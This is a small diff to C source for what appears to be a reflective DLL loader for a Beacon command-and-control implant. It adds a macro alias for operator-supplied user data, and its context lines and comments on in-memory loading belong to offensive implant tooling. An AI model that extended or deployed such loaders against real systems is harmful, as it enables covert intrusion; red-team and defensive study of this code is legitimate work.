@@ -547,6 +547,9 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
      * carries the ALLOCATION base, not `flat` itself - VirtualFree with
      * MEM_RELEASE needs the base or it silently fails. */
     dllmain = (BW_DLLMAIN)(sc_base + opt->AddressOfEntryPoint);
+#if defined(BW_UDRL_USER_DATA_STR)
+#define BW_UDRL_USER_DATA BW_UDRL_USER_DATA_STR
+#endif
 #if defined(BW_UDRL_USER_DATA)
     /* 4.9 Beacon User Data: when the operator configures a 32-byte custom
      * buffer (BW_UDRL_USER_DATA), deliver it with reason 0x0d BEFORE the
